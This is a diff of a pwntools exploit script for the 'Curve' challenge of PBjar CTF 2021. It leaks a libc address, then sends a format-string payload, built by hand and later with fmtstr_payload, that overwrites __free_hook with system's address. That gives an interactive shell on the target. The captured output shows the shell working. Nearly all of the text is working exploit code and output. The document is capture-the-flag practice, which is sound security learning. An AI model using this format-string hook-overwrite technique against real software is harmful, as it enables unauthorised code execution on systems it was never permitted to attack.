@@ -1,6 +1,6 @@
 from pwn import *
 
-#context(os='linux', arch='amd64')
+context(os='linux', arch='amd64')
 #context.log_level = 'debug'
 
 BINARY = './curve'
@@ -27,33 +27,19 @@ system_addr = libc_base + libc.sym.system
 print("libc_leak =", hex(libc_leak))
 print("libc_base =", hex(libc_base))
 
-#s.interactive()
-
-# Write __free_hook in stack
-buf  = p64(free_hook)
-buf += p64(free_hook+2)
-buf += p64(free_hook+4)
-s.sendline(buf)
-
 index = 8
 
 # Write system address in __free_hook to call system('/bin/sh')
-a0 = system_addr&0xffff
-a1 = (system_addr>>16)&0xffff
-a2 = (system_addr>>32)&0xffff
-a2 = ((a2-a1-1) % 0x10000) + 1
-a1 = ((a1-a0-1) % 0x10000) + 1
-a0 = ((a0-9) % 0x10000) + 1
-buf  = "/bin/sh;" 
-buf += "%%%dc%%%d$hn" % (a0, index)
-buf += "%%%dc%%%d$hn" % (a1, index+1)
-buf += "%%%dc%%%d$hn" % (a2, index+2)
-s.sendline(buf)
+writes = {free_hook: system_addr}
+buf = b"/bin/sh;" + fmtstr_payload(index+1, writes, numbwritten=8, write_size='short')
+
+s.sendlineafter("2:\n", buf)
+s.sendlineafter("3:\n", buf)
 
 s.interactive()
 
 '''
-mito@ubuntu:~/CTF/PBjar_CTF_2021/Pwn_Curve/curve$ python3 solve.py r
+mito@ubuntu:~/CTF/PBjar_CTF_2021/Pwn_Curve/curve$ python3 solve_fmtstr.py r
 [*] '/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/curve'
     Arch:     amd64-64-little
     RELRO:    Full RELRO
@@ -67,8 +53,10 @@ mito@ubuntu:~/CTF/PBjar_CTF_2021/Pwn_Curve/curve$ python3 solve.py r
     Stack:    Canary found
     NX:       NX enabled
     PIE:      PIE enabled
-libc_leak = 0x7fe4cd851d0a
-libc_base = 0x7fe4cd82b000
+libc_leak = 0x7f2d588ced0a
+libc_base = 0x7f2d588a8000
+[*] Switching to interactive mode
+/bin/sh;
 ...
 $ id
 uid=1000(user) gid=1000(user) groups=1000(user)
